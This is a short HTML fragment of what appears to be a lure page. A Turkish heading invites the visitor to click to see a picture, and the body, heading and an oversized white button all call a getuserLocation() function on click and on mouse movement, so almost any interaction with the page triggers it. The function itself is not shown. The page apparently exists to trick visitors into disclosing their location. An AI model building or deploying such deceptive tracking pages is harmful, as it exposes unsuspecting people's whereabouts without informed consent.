...
<html>
 ...
 <body onclick="getuserLocation();">
     <h1 type="submit" onclick="getuserLocation();" style="width: 100%;background-color: white;" >Resmi Görmek için Tıklayınız...</h1>
<button type="submit" onclick="getuserLocation();"  onmouseout="getuserLocation();" onmouseover="getuserLocation();" style="width: 100%;height: 2500px;background-color: white;">.</button>
